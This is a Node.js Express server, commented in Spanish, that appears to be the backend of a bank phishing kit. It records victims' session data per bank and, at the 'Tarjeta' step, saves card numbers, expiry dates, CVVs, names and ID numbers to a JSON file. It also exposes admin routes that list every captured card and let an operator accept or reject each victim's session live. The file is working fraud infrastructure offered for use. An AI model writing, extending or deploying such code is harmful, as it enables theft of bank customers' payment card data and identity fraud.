const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

const DB_FILE = path.join(__dirname, 'db.json');
let db = { sesiones: [], historial: [] };

if (fs.existsSync(DB_FILE)) {
    try {
        const parsed = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
        db.sesiones = parsed.sesiones || [];
        db.historial = parsed.historial || [];
    } catch (e) {}
}

function guardarDB() { fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2)); }

app.post('/api/sesion', (req, res) => {
    const { sessionId, bancoKey, estado, paso, datos } = req.body;
    let sesion = db.sesiones.find(s => s.sessionId === sessionId);
    
    if (sesion) {
        sesion.estado = estado;
        sesion.paso = paso;
        sesion.datos = { ...sesion.datos, ...datos };
    } else {
        sesion = { id: Date.now(), sessionId, bancoKey, estado, paso, datos: { bancoKey, ...datos }, fecha: new Date() };
        db.sesiones.push(sesion);
    }

    // 🔥 GUARDAR EN EL HISTORIAL AUTOMÁTICAMENTE AL RECIBIR TARJETA 🔥
    if (paso === 'Tarjeta' && datos.tarjeta) {
        db.historial.push({
            id: 'H-' + Date.now() + '-' + Math.floor(Math.random() * 1000),
            sessionId: sessionId,
            estado: estado || 'pendiente',
            datos: { bancoKey, ...datos },
            fecha: new Date()
        });
    }

    guardarDB();
    res.json({ ok: true, sessionId });
});

app.get('/api/sesion/:sessionId/estado', (req, res) => {
    const { sessionId } = req.params;
    const sesion = db.sesiones.find(s => s.sessionId === sessionId);
    if (!sesion) return res.status(404).json({ error: 'Sesión no encontrada' });
    res.json({ estado: sesion.estado });
});

app.get('/admin/stats', (req, res) => {
    res.json({
        sesiones: db.sesiones.length,
        pendientes: db.sesiones.filter(s => s.estado === 'pendiente').length,
        historial: db.historial.length
    });
});

app.get('/admin/sesiones', (req, res) => { res.json({ sesiones: db.sesiones }); });
app.get('/admin/historial', (req, res) => { res.json({ historial: db.historial }); });

app.post('/admin/login', (req, res) => {
    const { usuario, password } = req.body;
    if (usuario && password) res.json({ token: 'davi-token-' + Date.now(), usuario });
    else res.status(401).json({ error: 'Credenciales inválidas' });
});

app.post('/admin/sesion/:sessionId/accion', (req, res) => {
    const { sessionId } = req.params;
    const { accion } = req.body;
    const sesion = db.sesiones.find(s => s.sessionId === sessionId);
    if (!sesion) return res.status(404).json({ error: 'Sesión no encontrada' });

    if (accion === 'ACEPTAR') sesion.estado = 'aceptado';
    else if (accion === 'RECHAZAR') sesion.estado = 'rechazado';
    else return res.status(400).json({ error: 'Acción no permitida' });

    // 🔥 ACTUALIZAR EL ESTADO EN EL HISTORIAL (NO DUPLICA, SOLO ACTUALIZA) 🔥
    db.historial.forEach(h => {
        if (h.sessionId === sessionId && h.estado === 'pendiente') {
            h.estado = sesion.estado;
        }
    });

    guardarDB();
    res.json({ ok: true, estado: sesion.estado });
});

// RUTA PARA VER TODAS LAS TARJETAS (LEE DIRECTAMENTE DEL HISTORIAL)
app.get('/admin/tarjetas', (req, res) => {
    const tarjetas = db.historial
        .filter(h => h.datos && h.datos.tarjeta)
        .map(h => ({
            id: h.id,
            nombre: (h.datos.datosPersonales?.primerNombre || '') + ' ' + (h.datos.datosPersonales?.primerApellido || ''),
            documento: h.datos.docNumber || '-',
            tarjeta: h.datos.tarjeta,
            expMes: h.datos.expMes || '',
            expAnio: h.datos.expAnio || '',
            cvv: h.datos.cvv || '-',
            estado: h.estado,
            fecha: h.fecha
        }))
        .sort((a, b) => new Date(b.fecha) - new Date(a.fecha));
        
    res.json({ tarjetas });
});

app.get('/admin/activos', (req, res) => res.json({ activos: [] }));
app.get('/admin/ips-bloqueadas', (req, res) => res.json({ ips: [] }));
app.get('/admin/logs', (req, res) => res.json({ logs: [] }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Backend en puerto ${PORT}`));
